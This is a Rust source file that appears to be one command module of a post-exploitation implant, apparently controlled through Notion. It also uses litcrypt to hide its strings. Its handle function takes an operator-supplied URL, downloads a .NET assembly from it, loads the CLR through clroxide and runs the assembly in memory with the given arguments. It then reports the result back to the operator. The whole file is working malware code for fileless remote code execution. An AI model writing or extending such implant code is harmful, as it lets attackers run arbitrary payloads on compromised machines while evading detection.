use std::error::Error;
use litcrypt::lc;
use crate::cmd::{CommandArgs, notion_out};
use crate::logger::{Logger, log_out};
use clroxide::{
    clr::{Clr, ClrContext},
    primitives::{
        ICLRMetaHost,
        GUID,
        HRESULT
    }
};
use std::ffi::c_void;
use std::mem::transmute;
use reqwest::{get, StatusCode};

///
/// Executes .NET assembly in memory given a URL to the assembly and a set of arguments
/// 
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger)-> Result<String, Box<dyn Error>> {
    
    // Parse args
    // Check URL
    if let Some(url) = cmd_args.nth(0) {
        logger.debug(log_out!("Fetching Assembly at ", &url));
        // Fetch Assembly
        match get(&url).await {            
            Ok(r) => {
                if r.status() == StatusCode::OK {
                    logger.debug(log_out!("Assembly retrieved"));
                    if let Ok(assembly) = r.bytes().await {
                        let assembly_args: Vec<String> = cmd_args.collect();
                        // Instantiate CLR

                        if let Ok(mut clr) = Clr::new(assembly.to_vec(), assembly_args) {
                            // Get clr context
                            // Run Assembly
                            // Return Output
                            logger.debug(log_out!("CLR Created"));
                            let res: String = clr.run().unwrap();
                            dbg!("{:?}", res);
                            return notion_out!(res);
                        }
                    }
                } else {
                    let status_code = r.status();
                    return notion_out!("Could not download: HTTP ", status_code.as_str());
                }
            },
            Err(_) => {
                return notion_out!("Could not request", &url);
            }
        }

    } else {
        return notion_out!("No URL provided!")
    }

    notion_out!("Assembly Executed!")
}